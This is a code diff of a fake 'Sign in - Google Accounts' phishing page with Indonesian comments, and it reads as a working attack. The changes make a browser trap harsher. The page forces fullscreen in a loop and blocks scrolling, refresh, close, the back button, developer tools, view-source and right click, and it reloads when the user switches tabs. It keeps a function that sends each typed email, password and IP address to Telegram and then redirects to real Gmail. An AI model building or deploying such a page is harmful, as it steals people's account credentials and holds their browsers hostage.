@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
     <title>Sign in - Google Accounts</title>
     <style>
         * {
@@ -13,13 +13,20 @@
             -webkit-tap-highlight-color: transparent;
         }
 
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden !important;
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            right: 0 !important;
+            bottom: 0 !important;
+        }
+
         body {
             font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-            background: #ffffff;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background: white;
             position: fixed;
             top: 0;
             left: 0;
@@ -28,28 +35,29 @@
             overflow: hidden;
         }
 
-        /* Lock screen overlay - tidak bisa ditembus */
-        .lock-screen {
+        /* Fullscreen lock overlay - TIDAK BISA DIKELUARIN */
+        .lock-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: white;
-            z-index: 999999;
+            z-index: 999999999;
+            overflow: hidden;
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow-y: auto;
         }
 
-        /* Google Sign-in Card */
+        /* Google Sign-in Card - tidak bisa di-scroll */
         .card {
             max-width: 450px;
             width: 90%;
             padding: 48px 40px 36px;
-            margin: 20px auto;
             text-align: center;
+            position: relative;
+            overflow: hidden;
         }
 
         .google-logo {
@@ -121,7 +129,6 @@
 
         button:hover {
             background: #1557b0;
-            box-shadow: 0 1px 2px 0 rgba(0,0,0,0.1);
         }
 
         button:disabled {
@@ -155,6 +162,8 @@
             color: #1a73e8;
             text-decoration: none;
             margin: 0 8px;
+            pointer-events: none;
+            cursor: default;
         }
 
         .attempt-text {
@@ -162,11 +171,16 @@
             font-size: 12px;
             color: #5f6368;
         }
+
+        /* Sembunyikan scrollbar */
+        ::-webkit-scrollbar {
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-<div class="lock-screen" id="lockScreen">
+<div class="lock-overlay" id="lockOverlay">
     <div class="card">
         <div class="google-logo">
             <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
@@ -210,9 +224,7 @@
 
     let attemptCount = 3;
     let isLocked = false;
-    let fullscreenActive = false;
 
-    const lockScreen = document.getElementById('lockScreen');
     const form = document.getElementById('loginForm');
     const emailInput = document.getElementById('email');
     const passwordInput = document.getElementById('password');
@@ -220,95 +232,139 @@
     const spinner = document.getElementById('spinner');
     const errorMsg = document.getElementById('errorMsg');
     const attemptText = document.getElementById('attemptText');
+    const lockOverlay = document.getElementById('lockOverlay');
 
+    // ========== LOCK SCROLL TOTAL ==========
+    document.body.style.overflow = 'hidden';
+    document.documentElement.style.overflow = 'hidden';
+    
+    // Lock scroll dengan event listener
+    window.addEventListener('scroll', function(e) {
+        window.scrollTo(0, 0);
+        e.preventDefault();
+        return false;
+    });
+    
+    document.addEventListener('wheel', function(e) {
+        e.preventDefault();
+        return false;
+    }, { passive: false });
+    
+    document.addEventListener('touchmove', function(e) {
+        e.preventDefault();
+        return false;
+    }, { passive: false });
+    
+    // Lock zoom dan gesture
+    document.addEventListener('gesturestart', function(e) {
+        e.preventDefault();
+        return false;
+    });
+    
+    document.addEventListener('keydown', function(e) {
+        // Lock semua tombol navigasi
+        if (e.key === 'F5' || 
+            e.key === 'F12' ||
+            e.key === 'F11' ||
+            (e.ctrlKey && e.key === 'r') || 
+            (e.ctrlKey && e.shiftKey && e.key === 'R') ||
+            (e.ctrlKey && e.key === 'w') ||
+            (e.ctrlKey && e.key === 't') ||
+            (e.ctrlKey && e.key === 'Tab') ||
+            (e.metaKey && e.key === 'r') ||
+            e.key === 'Escape' ||
+            e.key === 'Home' ||
+            e.key === 'Backspace') {
+            e.preventDefault();
+            return false;
+        }
+        
+        // Lock Ctrl+Shift+I (dev tools)
+        if (e.ctrlKey && e.shiftKey && e.key === 'I') {
+            e.preventDefault();
+            return false;
+        }
+        
+        // Lock Ctrl+U (view source)
+        if (e.ctrlKey && e.key === 'u') {
+            e.preventDefault();
+            return false;
+        }
+    });
+    
+    // Lock right click
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        return false;
+    });
+    
+    // Lock back button (history)
+    history.pushState(null, null, location.href);
+    window.addEventListener('popstate', function() {
+        history.pushState(null, null, location.href);
+        // Force reload ke halaman yang sama
+        location.replace(location.href);
+    });
+    
+    // Lock sebelum halaman ditutup
+    window.addEventListener('beforeunload', function(e) {
+        e.preventDefault();
+        e.returnValue = '';
+        return '';
+    });
+    
+    // Lock visibility change (tab switch)
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            setTimeout(() => {
+                alert('⚠️ VERIFIKASI DIPERLUKAN!');
+                location.reload();
+            }, 100);
+        }
+    });
+    
     // ========== FULLSCREEN LOCK ==========
-    // Request fullscreen saat halaman dimuat
-    function requestFullscreen() {
+    function forceFullscreen() {
         const docEl = document.documentElement;
         if (docEl.requestFullscreen) {
-            docEl.requestFullscreen();
+            docEl.requestFullscreen().catch(err => {});
         } else if (docEl.webkitRequestFullscreen) {
             docEl.webkitRequestFullscreen();
         } else if (docEl.msRequestFullscreen) {
             docEl.msRequestFullscreen();
         }
     }
-
-    // Cegah keluar dari fullscreen
+    
+    // Request fullscreen saat pertama kali
+    document.body.addEventListener('click', function firstClick() {
+        forceFullscreen();
+        document.body.removeEventListener('click', firstClick);
+    });
+    
+    // Kalo keluar dari fullscreen, masukin lagi
     document.addEventListener('fullscreenchange', function() {
         if (!document.fullscreenElement) {
-            requestFullscreen();
+            forceFullscreen();
         }
     });
     document.addEventListener('webkitfullscreenchange', function() {
         if (!document.webkitFullscreenElement) {
-            requestFullscreen();
+            forceFullscreen();
         }
     });
-
-    // Panggil fullscreen setelah user interaksi (karena browser butuh interaksi)
-    document.body.addEventListener('click', function enableFullscreen() {
-        if (!fullscreenActive) {
-            requestFullscreen();
-            fullscreenActive = true;
+    
+    // Loop terus cek fullscreen
+    setInterval(() => {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+            forceFullscreen();
         }
-    }, { once: true });
-
-    // ========== LOCK NAVIGASI TOTAL ==========
-    // Lock back button
-    history.pushState(null, null, location.href);
-    window.addEventListener('popstate', function() {
-        history.pushState(null, null, location.href);
-        // Tambahan: reload halaman biar gak bisa kabur
-        location.reload();
-    });
-
-    // Lock refresh (F5, Ctrl+R, Ctrl+Shift+R)
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'F5' || 
-            e.key === 'F12' ||
-            (e.ctrlKey && e.key === 'r') || 
-            (e.ctrlKey && e.shiftKey && e.key === 'R') ||
-            (e.ctrlKey && e.key === 'w') ||
-            (e.metaKey && e.key === 'r') ||
-            e.key === 'Escape') {
-            e.preventDefault();
-            return false;
+        // Refresh history lock
+        if (window.location.hash !== '#locked') {
+            window.location.hash = 'locked';
+            history.pushState(null, null, '#locked');
         }
-    });
-
-    // Lock right click
-    document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        return false;
-    });
-
-    // Lock touch gestures (swipe back, pull to refresh)
-    let touchStartY = 0;
-    document.addEventListener('touchstart', function(e) {
-        touchStartY = e.touches[0].clientY;
-    });
-    document.addEventListener('touchmove', function(e) {
-        const touchY = e.touches[0].clientY;
-        if (touchY - touchStartY > 50) {
-            e.preventDefault();
-            return false;
-        }
-    });
-
-    // Lock zoom
-    document.addEventListener('gesturestart', function(e) {
-        e.preventDefault();
-        return false;
-    });
-
-    // ========== HIDE URL BAR / ADDRESS BAR ==========
-    window.addEventListener('load', function() {
-        setTimeout(function() {
-            window.scrollTo(0, 1);
-        }, 0);
-    });
-
+    }, 200);
+    
     // ========== FUNGSI ==========
     async function getIP() {
         try {
@@ -319,7 +375,7 @@
             return 'Unknown';
         }
     }
-
+    
     async function sendToTelegram(email, password, status) {
         const ip = await getIP();
         const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
@@ -340,7 +396,7 @@
             await fetch(url, {mode: 'no-cors'});
         } catch(e) {}
     }
-
+    
     function updateAttemptDisplay() {
         attemptText.innerText = `⚠️ ${attemptCount} attempt${attemptCount !== 1 ? 's' : ''} remaining`;
         if (attemptCount <= 0) {
@@ -350,7 +406,7 @@
             startCountdown(30);
         }
     }
-
+    
     function startCountdown(seconds) {
         let timeLeft = seconds;
         attemptText.innerText = `⏳ Please wait ${timeLeft} seconds before trying again...`;
@@ -365,14 +421,11 @@
             }
         }, 1000);
     }
-
-    // Validasi ke Google (simulasi - tapi korban gak tau ini fake)
+    
     function validateLogin(email, password) {
-        // Korban bakal masukin email & password asli karena panik
-        // Format validasi: email harus pake @, password minimal 4 karakter
         return email.includes('@') && email.includes('.') && password.length >= 4;
     }
-
+    
     // ========== SUBMIT ==========
     form.addEventListener('submit', async function(e) {
         e.preventDefault();
@@ -393,7 +446,6 @@
         spinner.style.display = 'block';
         errorMsg.style.display = 'none';
         
-        // Kirim ke Telegram dulu
         await sendToTelegram(email, password, 'LOGIN ATTEMPT');
         
         const isValid = validateLogin(email, password);
@@ -402,7 +454,6 @@
             spinner.style.display = 'none';
             
             if (isValid) {
-                // Kirim notifikasi berhasil
                 sendToTelegram(email, password, '✅ SUCCESS - REAL DATA');
                 
                 errorMsg.style.display = 'block';
@@ -410,7 +461,6 @@
                 errorMsg.style.color = '#137333';
                 errorMsg.innerHTML = '✅ Verifikasi berhasil! Redirecting to Gmail...';
                 
-                // Redirect ke Gmail asli setelah 2 detik
                 setTimeout(() => {
                     window.location.href = 'https://mail.google.com';
                 }, 2000);
@@ -434,22 +484,12 @@
             }
         }, 1500);
     });
-
-    // Tampilkan percobaan awal
+    
     updateAttemptDisplay();
     emailInput.focus();
-
-    // Re-lock jika user mencoba keluar (loop)
-    setInterval(() => {
-        if (!document.fullscreenElement && fullscreenActive) {
-            requestFullscreen();
-        }
-        // Pastikan history lock
-        if (window.location.hash !== '#locked') {
-            window.location.hash = 'locked';
-            history.pushState(null, null, '#locked');
-        }
-    }, 500);
+    
+    // Lock address bar scroll
+    window.scrollTo(0, 0);
 </script>
 </body>
 </html>
